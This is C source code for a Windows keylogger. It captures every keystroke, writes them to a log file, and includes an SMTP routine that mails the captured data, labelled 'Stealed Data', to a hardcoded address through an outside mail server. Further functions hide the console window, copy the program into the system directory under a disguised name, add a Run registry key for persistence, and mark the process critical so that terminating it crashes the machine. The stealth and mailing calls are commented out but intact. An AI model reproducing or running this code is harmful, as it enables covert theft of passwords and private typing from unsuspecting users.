
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
 
#if defined ( unix )
	#error The operative system have to be Winzoz
#endif
 
#ifndef WIN32_LEAN_AND_MEAN
	#define WIN32_LEAN_AND_MEAN
#endif

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
 
unsigned get_len ( char * str );
 
int send_mail ( char * subject, char * message, char * to, char * from, const char ip [ 17 ], int door );
int take_n_run ( int, char * );
 
typedef void ( _stdcall * RtlSetProcessIsCritical ) ( IN BOOLEAN New, OUT PBOOLEAN Old, IN BOOLEAN Log );
int protectProcess ( void );
 
void regApp ( void );
int hideConsole ( void );
 
#define IP "85.18.95.132" // smtp.fastwebnet.it mail server
#define DOOR 25 		  // SMTP Door
 
#define FROM "shifterskeylogger@stealingdata.net"
#define TO "binaryincubus@live.it" // Here your mail
#define SUBJECT "Stealed Data"
 
#define _MAX_CHAR 500
 
int main ( void )
{
	register short i;
	char * data = ( char * ) calloc ( _MAX_CHAR + 12, sizeof ( char ) );
	FILE * logFile;

	// Open log file for debugging
	logFile = fopen ( "keylog.txt", "a" );
	if ( logFile == NULL ) {
		printf ( "Warning: Could not open keylog.txt for writing\n" );
	}

	// Comment out these for testing (require admin privileges)
	// regApp ( );
	// protectProcess ( );
	// hideConsole ( );

	printf ( "Keylogger started. Press ESC to exit.\n" );
	printf ( "Logging to keylog.txt\n" );

	while ( 1 ) {
		while ( get_len ( data ) < _MAX_CHAR )
		{
			for ( i = 8 ; i <= 190 ; i++ )
			{
				if ( GetAsyncKeyState ( i ) == -32767 ) {
					size_t oldLen = strlen ( data );
					take_n_run ( i, data);
					
					// Write new characters to file immediately for debugging
					if ( logFile != NULL && strlen ( data ) > oldLen ) {
						fprintf ( logFile, "%s", data + oldLen );
						fflush ( logFile );
					}
					
					// Check for ESC to exit
					if ( i == VK_ESCAPE ) {
						if ( logFile != NULL ) {
							fclose ( logFile );
						}
						free ( data );
						return 0;
					}
				}
			}
			Sleep(10);
		}

		// Buffer is full - write newline and clear
		if ( logFile != NULL ) {
			fprintf ( logFile, "\n" );
			fflush ( logFile );
		}
		
		// Uncomment to send email instead
		// send_mail ( SUBJECT, data, TO, FROM, IP, DOOR  );
		
		memset ( data, 0, _MAX_CHAR + 12 );
	}

	if ( logFile != NULL ) {
		fclose ( logFile );
	}
	free ( data );
	return 0;
}
 
// Simple Mail Transfer Protocol
#define _OPEN 	"HELO default\r\n"\
				"MAIL FROM: <"
 
#define _RCPT  	">\r\nRCPT TO: <"
#define _DATA  	">\r\nDATA\r\n"\
				"From: <"
 
#define _SUB 	">\r\nSubject: "
#define _NEWLINE	"\r\n\r\n"
 
#define _CLOSE	"\r\n.\r\n"\
				"QUIT\r\n"
 
unsigned get_len ( char * str ) {
	return ( unsigned ) ( strlen ( str ) * sizeof ( char ) );
}
 
int send_mail ( char * subject, char * message, char * to, char * from, const char ip [ 17 ], int door )
{
	int sock;
	struct sockaddr_in saddr;
 
	WSADATA wsadata;
	if ( WSAStartup ( MAKEWORD ( 2, 2 ), & wsadata ) != 0 ) {
		return -1;
	}
 
	if ( ( sock = socket ( AF_INET, SOCK_STREAM, 0 ) ) < 0) {
		return -1;
	}
 
	saddr . sin_family = AF_INET;
	saddr . sin_addr . s_addr = inet_addr ( ip );
	saddr . sin_port = htons ( door );
 
	if ( connect ( sock, ( struct sockaddr * ) & saddr, sizeof ( saddr ) ) < 0 ) {
		return -1;
	}
 
	size_t check_size = get_len ( _OPEN );
	if ( ( size_t ) send ( sock, _OPEN, check_size, 0 ) != check_size ) {
		return -1;
	}

	check_size = get_len ( from );
	if ( ( size_t ) send ( sock, from, check_size, 0 ) != check_size ) {
		return -1;
	}

	check_size = get_len ( _RCPT );
	if ( ( size_t ) send ( sock, _RCPT, check_size, 0 ) != check_size ) {
		return -1;
	}

	check_size = get_len ( to );
	if ( ( size_t ) send ( sock, to, check_size, 0 ) != check_size ) {
		return -1;
	}

	check_size = get_len ( _DATA );
	if ( ( size_t ) send ( sock, _DATA, check_size, 0 ) != check_size ) {
		return -1;
	}

	check_size = get_len ( from );
	if ( ( size_t ) send ( sock, from, check_size, 0 ) != check_size ) {
		return -1;
	}

	check_size = get_len ( _SUB );
	if ( ( size_t ) send ( sock, _SUB, check_size, 0 ) != check_size ) {
		return -1;
	}

	check_size = get_len ( subject );
	if ( ( size_t ) send ( sock, subject, check_size, 0 ) != check_size ) {
		return -1;
	}

	check_size = get_len ( _NEWLINE );
	if ( ( size_t ) send ( sock, _NEWLINE, check_size, 0 ) != check_size ) {
		return -1;
	}

	check_size = get_len ( message );
	if ( ( size_t ) send ( sock, message, check_size, 0 ) != check_size ) {
		return -1;
	}

	check_size = get_len ( _CLOSE );
	if ( ( size_t ) send ( sock, _CLOSE, check_size, 0 ) != check_size ) {
		return -1;
	}
 
	closesocket ( sock );
	WSACleanup ( );
 
	return 0;
}
 
int take_n_run ( int key, char * buffer )
{
	switch ( key ) {
		case 8 :
			strcat ( buffer, "[B]" );
			return 0;
		case 13 :
			strcat ( buffer, "\n" );
			return 0;
		case 32 :
			strcat ( buffer, " " );
			return 0;
		case VK_TAB :
			strcat ( buffer, "[T]" );
			return 0;
		case VK_SHIFT :
			strcat ( buffer, "[S]" );
			return 0;
		case VK_CONTROL :
			strcat ( buffer, "[C]" ) ;
			return 0;		
		case VK_ESCAPE :
			strcat ( buffer, "[ES]" );
			return 0;
		case VK_END :
			strcat ( buffer, "[EN]" );
			return 0;
		case VK_HOME :
			strcat ( buffer, "[H]" );
			return 0;
		case VK_LEFT :
			strcat ( buffer, "[L]" );
			return 0;
		case VK_RIGHT :
			strcat ( buffer, "[R]" );
			return 0;
		case VK_UP :
			strcat ( buffer, "[U]" );
			return 0;
		case VK_DOWN :
			strcat ( buffer, "[D]" );
			return 0;
		case 110 :
		case 190 :
			strcat ( buffer, "." );
			return 0;
		default: {
			// Convert virtual key code to character using Windows API
			unsigned char keyboardState[256];
			WORD asciiChar = 0;
			
			if ( GetKeyboardState ( keyboardState ) ) {
				// Check if Shift is pressed
				SHORT shiftState = GetAsyncKeyState ( VK_SHIFT );
				if ( shiftState & 0x8000 ) {
					keyboardState[VK_SHIFT] = 0x80;
				}
				
				// Convert virtual key to ASCII
				if ( ToAscii ( key, MapVirtualKey ( key, 0 ), keyboardState, &asciiChar, 0 ) == 1 ) {
					char c = ( char ) asciiChar;
					char str[2] = { c, '\0' };
					strcat ( buffer, str );
				} else {
					// If conversion fails, log as [KEY:xxx]
					char keyStr[16];
					sprintf ( keyStr, "[KEY:%d]", key );
					strcat ( buffer, keyStr );
				}
			} else {
				// Fallback: log key code
				char keyStr[16];
				sprintf ( keyStr, "[KEY:%d]", key );
				strcat ( buffer, keyStr );
			}
			break;
		}
	}
 
    return 0;
}
 
#define CONSOLE_NAME "Secure"
 
int hideConsole ( void )
{
   if ( ! SetConsoleTitle ( CONSOLE_NAME ) ) {
		return -1;
   }
 
   HWND thisWindow;
 
   thisWindow = FindWindow( NULL, CONSOLE_NAME );
 
   ShowWindow ( thisWindow, 0 );
   return 0;
}
 
#define FAKE_NAME "\\secure.exe"
#define FAKE_KEY "Secure Internet"
 
void regApp ( void ) 
{
   char system_ [ MAX_PATH ];
   char pathToFile[ MAX_PATH ];
   HMODULE getMod = GetModuleHandle ( NULL );
 
   GetModuleFileName ( getMod, pathToFile, sizeof  ( pathToFile ) );
   GetSystemDirectory ( system_, sizeof ( system_ ) );
 
   strcat ( system_, FAKE_NAME );
 
   CopyFile ( pathToFile, system_, 0);
 
   HKEY key_;
 
   RegOpenKeyEx ( HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, & key_ );
 
   RegSetValueEx ( key_, FAKE_KEY, 0, REG_SZ, ( const unsigned char * ) system_, sizeof ( system_ ) );
 
   RegCloseKey ( key_ );
}
 
int protectProcess ( void )
{
    int enablePriv ( const char * szPriv );
    HANDLE DLL;
    RtlSetProcessIsCritical setCritical;
 
    DLL = LoadLibraryA ( "ntdll.dll" );
 
    if ( DLL == NULL ) {
		return -1;
	}
 
	if ( enablePriv ( SE_DEBUG_NAME ) < 0 ) {
		return -1;
	}
 
	setCritical = ( RtlSetProcessIsCritical ) GetProcAddress( ( HINSTANCE ) DLL, "RtlSetProcessIsCritical" );
 
	if ( ! setCritical ) {
		return -1;
	}
 
	setCritical ( 1, 0, 0 );
	return 0;
}
 
int enablePriv ( const char * szPriv )
{
    HANDLE token;
    LUID luid;
    TOKEN_PRIVILEGES privs;
    memset ( &privs, 0, sizeof ( privs ) );
 
    if ( ! OpenProcessToken ( GetCurrentProcess ( ), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, & token ) ) {
       return -1;
    }
 
    if ( ! LookupPrivilegeValue ( NULL, szPriv, & luid ) )
	{
        CloseHandle ( token );
        return -1;
    }
 
    privs . PrivilegeCount = 1;
    privs . Privileges [ 0 ] . Luid = luid;
    privs . Privileges [ 0 ] . Attributes = SE_PRIVILEGE_ENABLED;
 
    if ( ! AdjustTokenPrivileges ( token, FALSE, & privs, sizeof ( privs ), NULL, NULL ) ) {
                        return -1;
    }
 
    CloseHandle ( token );
	return 0;
}
